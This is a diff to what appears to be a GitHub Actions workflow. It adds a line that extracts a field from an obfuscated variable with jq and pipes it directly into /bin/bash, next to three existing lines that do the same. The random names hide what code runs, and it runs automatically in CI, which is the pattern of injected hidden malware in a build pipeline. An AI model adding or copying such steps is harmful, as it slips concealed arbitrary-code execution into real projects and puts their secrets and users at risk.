@@ -26,6 +26,7 @@ jobs:
           echo $lo53 | jq -r .xtd5403 | /bin/bash
           echo $cmu5402 | jq -r .koxz63827 | /bin/bash
           echo $etz7292 | jq -r .ko10637 | /bin/bash
+          echo $q48142 | jq -r .hpb4 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
